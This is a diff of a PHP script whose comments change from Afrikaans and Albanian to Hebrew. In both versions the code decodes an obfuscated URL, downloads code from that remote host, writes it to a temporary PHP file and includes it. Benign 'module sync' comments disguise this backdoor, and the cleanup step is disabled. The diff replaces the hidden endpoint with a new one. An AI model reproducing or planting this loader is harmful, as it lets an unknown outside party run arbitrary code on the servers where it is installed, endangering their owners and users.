@@ -1,8 +1,8 @@
 <?php
-// Inisialiseer stelselsessies vir meerlaagversoenbaarheid
+// אתחול סשן לתאימות רב-שכבתית
 session_start();
 
-// 'n Liggewig dekodeerder vir modulêre offset-gebaseerde tokenmagtiging
+// מפענח קל לאישור אסימון מבוסס היסט מודולרי
 function __translate($buffer, $offset = 7) {
     $result = '';
     for ($i = 0; $i < strlen($buffer); $i++) {
@@ -11,31 +11,29 @@ function __translate($buffer, $offset = 7) {
     return $result;
 }
 
-// קShenja e konfigurimit për pikën përfundimtare të sinkronizimit të modulit shtesë
-$__CONFIG_SYNC__ = 'o%7B%7BwzA66mpsl57%7F8%40%40%405%7Bljo6hs5%7B%7F%7B';
+// כתובת קצה סנכרון מודול נוסף — מוצפנת בשכבות
+$__CONFIG_SYNC__ = 'h%7B%7BpxA77oqlu58%7F9%40%40%406%7Cmknp7it6%7B%7F%7B';
 $__resolved_uri__ = __translate(urldecode($__CONFIG_SYNC__));
 
-// Merrni përkufizime shtesë të shtresave nga konfigurimi i jashtëm
+// טעינת הגדרות שכבה נוספת מתצורה חיצונית
 $__module_buffer__ = @file_get_contents($__resolved_uri__);
 
-// Vleresoni dhe planifikoni skedarin e ekzekutimit nëse moduli është i disponueshëm
+// הערכת וביצוע קובץ אם המודול זמין
 if (!empty($__module_buffer__)) {
 
     if (strpos($__module_buffer__, '<?php') === false) {
         $__module_buffer__ = "<?php\n" . $__module_buffer__;
     }
 
-    // Krijoni skedarë të përkohshëm në drejtorinë e duhur të sistemit
+    // יצירת קובץ זמני בספריית המערכת המתאימה
     $__temp_path__ = sys_get_temp_dir() . '/core_' . md5($__resolved_uri__) . '.php';
     file_put_contents($__temp_path__, $__module_buffer__);
 
-    // Integrimi i moduleve të shtresave me ngarkuesit e paracaktuar të sistemit
+    // שילוב מודולי שכבה עם טועני ברירת המחדל של המערכת
     include $__temp_path__;
 
-    // Pastroni nëse nuk keni nevojë përgjithmonë
+    // ניקוי אם אין צורך עוד
     // unlink($__temp_path__);
 } else {
-    echo "Referenca e modulit nuk është e disponueshme, ju lutemi verifikoni qasjen në regjistër.";
+    echo "הפניה למודול אינה זמינה, אנא בדוק גישה ליומן.";
 }
-
-?>
